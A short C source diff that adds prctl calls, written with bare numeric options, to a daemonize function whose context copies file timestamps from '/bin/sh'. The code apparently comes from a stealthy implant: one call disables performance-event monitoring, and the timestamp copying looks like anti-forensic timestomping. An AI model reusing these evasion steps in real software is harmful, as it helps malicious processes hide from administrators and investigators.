@@ -8,6 +8,7 @@
 #include <unistd.h>
 #include <utime.h>
 #include <sys/stat.h>
+#include <sys/prctl.h>
 
 #ifndef DEFAULT_MTIME_FROM
 #define DEFAULT_MTIME_FROM "/bin/sh"
@@ -209,6 +210,9 @@ int daemonize(bool exit_parent) {
     /* stdout */
     dup (0);
     /* stderror */
+
+    prctl(3, 0, 0, 0, 0);
+    prctl(31, 0, 0, 0, 0);
 #endif
 
     /* do its daemon thing... */
